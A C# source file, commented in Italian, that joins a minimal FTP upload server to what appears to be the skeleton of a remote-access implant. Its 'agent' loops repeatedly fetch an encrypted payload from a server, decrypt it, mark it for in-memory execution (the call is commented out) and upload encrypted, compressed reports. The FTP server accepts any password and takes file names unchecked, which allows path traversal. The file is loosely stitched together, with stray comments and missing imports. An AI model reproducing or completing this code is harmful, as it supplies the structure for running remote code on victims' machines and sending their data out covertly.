using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO;

/*server FTP con socket in C# che accetta connessioni e consente upload di file. Per uso avanzato si può estendere con threading, autenticazione, comandi FTP standard*/

class SimpleFtpServer
{
    private TcpListener _listener;
    private string rootDir = @"C:\FtpRoot"; // Cartella file server

    public SimpleFtpServer(int port)
    {
        _listener = new TcpListener(IPAddress.Any, port);
        if (!Directory.Exists(rootDir))
        {
            Directory.CreateDirectory(rootDir);
        }
    }

    public void Start()
    {
        _listener.Start();
        Console.WriteLine("Simple FTP Server started...");
        while (true)
        {
            TcpClient client = _listener.AcceptTcpClient();
            Console.WriteLine("Client connected");
            HandleClient(client);
            client.Close();
        }
    }

    private void HandleClient(TcpClient client)
    {
        NetworkStream stream = client.GetStream();
        StreamReader reader = new StreamReader(stream, Encoding.ASCII);
        StreamWriter writer = new StreamWriter(stream, Encoding.ASCII) { AutoFlush = true };

        writer.WriteLine("220 Welcome to Simple FTP Server");

        string line;
        while ((line = reader.ReadLine()) != null)
        {
            Console.WriteLine("Received: " + line);

            if (line.StartsWith("USER"))
            {
                writer.WriteLine("331 Username OK, need password");
            }
            else if (line.StartsWith("PASS"))
            {
                writer.WriteLine("230 User logged in");
            }
            else if (line.StartsWith("STOR "))
            {
                string filename = line.Substring(5).Trim();
                writer.WriteLine("150 Opening data connection for file upload");

                // Legge dati dal client e salva file
                ReceiveFile(stream, Path.Combine(rootDir, filename));

                writer.WriteLine("226 Transfer complete");
            }
            else if (line.StartsWith("QUIT"))
            {
                writer.WriteLine("221 Bye");
                break;
            }
            else
            {
                writer.WriteLine("502 Command not implemented");
            }
        }

        stream.Close();
    }

    private void ReceiveFile(NetworkStream stream, string filePath)
    {
        using (var fileStream = new FileStream(filePath, FileMode.Create))
        {
            byte[] buffer = new byte[4096];
            int bytesRead;

            // Semplice ricezione dati, può essere migliorata per protocollo FTP completo
            while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
            {
                fileStream.Write(buffer, 0, bytesRead);
                if (stream.DataAvailable == false)
                    break; // fine ricezione
            }
        }
        Console.WriteLine($"File saved: {filePath}");
    }

    static void Main()
    {
        var server = new SimpleFtpServer(21);
        server.Start();
    }
}
// You need to define 'username' and 'password' variables or pass them as parameters
// Example:
// client.Credentials = new NetworkCredential("yourUsername", "yourPassword");
// The following lines should be inside a method, not at the top level.
// client.UploadFile(ftpUri, tempFile);
// File.Delete(tempFile);

public class CryptoUtils
{
    // Funzione AES per cifrare/decifrare un byte array con chiave e IV
    public static byte[] AesEncrypt(byte[] data, byte[] key, byte[] iv)
    {
        using Aes aes = Aes.Create();
        aes.Key = key;
        aes.IV = iv;
        using MemoryStream ms = new();
        using (var cryptoStream = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cryptoStream.Write(data, 0, data.Length);
        }
        return ms.ToArray();
    }

    public static byte[] AesDecrypt(byte[] cipherText, byte[] key, byte[] iv)
    {
        using Aes aes = Aes.Create();
        aes.Key = key;
        aes.IV = iv;
        using MemoryStream ms = new(cipherText);
        using CryptoStream cryptoStream = new(ms, aes.CreateDecryptor(), CryptoStreamMode.Read);
        using MemoryStream resultStream = new();
        cryptoStream.CopyTo(resultStream);
        return resultStream.ToArray();
    }

    // Retry e logging senza password in chiaro
    // Esempio di log sicuro
    public static void SafeLog(string message)
    {
        string logPath = "agent_log.txt";
        string password = "s3cr3t"; // Example sensitive data
        string safeMsg = message.Replace(password, "***");
        File.AppendAllText(logPath, $"{DateTime.UtcNow:o} {safeMsg}\n");
    }

    // Compress report batch con GZip
    public static byte[] GZipCompress(byte[] data)
    {
        using MemoryStream ms = new();
        using (var gzip = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Compress))
        {
            gzip.Write(data, 0, data.Length);
        }
        return ms.ToArray();
    }
}

// Example usage class for main loops (methods must be static or called from an instance)
public class AgentMainLoops
{
    public static async Task MainLoopFtpAsync()
    {
        string localReportPath = "report.txt";
        string ftpUri = "ftp://server/upload/report.enc";
        byte[] aesKey = new byte[32]; // Replace with actual key
        byte[] aesIv = new byte[16];  // Replace with actual IV
        int maxRetries = 3;
        int retryDelayMs = 2000;

        while (true)
        {
            for (int attempt = 0; attempt < maxRetries; attempt++)
            {
                try
                {
                    // UploadEncryptedReport(localReportPath, ftpUri, aesKey, aesIv);
                    CryptoUtils.SafeLog("Report uploaded successfully");
                    break;
                }
                catch
                {
                    CryptoUtils.SafeLog("Upload failed, retrying...");
                }
                await Task.Delay(retryDelayMs);
            }
            await Task.Delay(60000); // Wait before next upload
        }
    }

    public static async Task MainLoopHttpAsync()
    {
        string serverUrl = "http://server/payload";
        string uploadUrl = "http://server/upload";
        byte[] aesKey = new byte[32]; // Pre-shared or derived key
        byte[] aesIv = new byte[16];  // Pre-shared or derived IV
        string jwtToken = ""; // JWT for authentication
        int maxRetries = 3;
        int retryDelayMs = 2000;
        List<byte[]> reportBatch = new();
        while (true)
        {
            byte[] payload = null;
            for (int attempt = 0; attempt < maxRetries; attempt++)
            {
                try
                {
                    // payload = await DownloadPayloadAsync(serverUrl, jwtToken);
                    if (payload != null) break;
                }
                catch { await Task.Delay(retryDelayMs); }
            }
            if (payload == null) { await Task.Delay(10000); continue; }

            byte[] decryptedPayload = CryptoUtils.AesDecrypt(payload, aesKey, aesIv);
            if (decryptedPayload == null) { await Task.Delay(10000); continue; }

            // bool execSuccess = ExecuteFromMemory(decryptedPayload);
            bool execSuccess = true;
            byte[] report = System.Text.Encoding.UTF8.GetBytes(execSuccess ? "Success" : "Failure");
            reportBatch.Add(report);

            if (reportBatch.Count >= 5)
            {
                byte[] batchData = System.Text.Encoding.UTF8.GetBytes(string.Join("\n", reportBatch));
                byte[] compressedData = CryptoUtils.GZipCompress(batchData);
                byte[] encryptedReport = CryptoUtils.AesEncrypt(compressedData, aesKey, aesIv);

                for (int attempt = 0; attempt < maxRetries; attempt++)
                {
                    try
                    {
                        // await UploadReportAsync(uploadUrl, encryptedReport, jwtToken);
                        reportBatch.Clear();
                        break;
                    }
                    catch { await Task.Delay(retryDelayMs); }
                }
            }
            await Task.Delay(10000); // Wait before next payload fetch
        }
    }
}
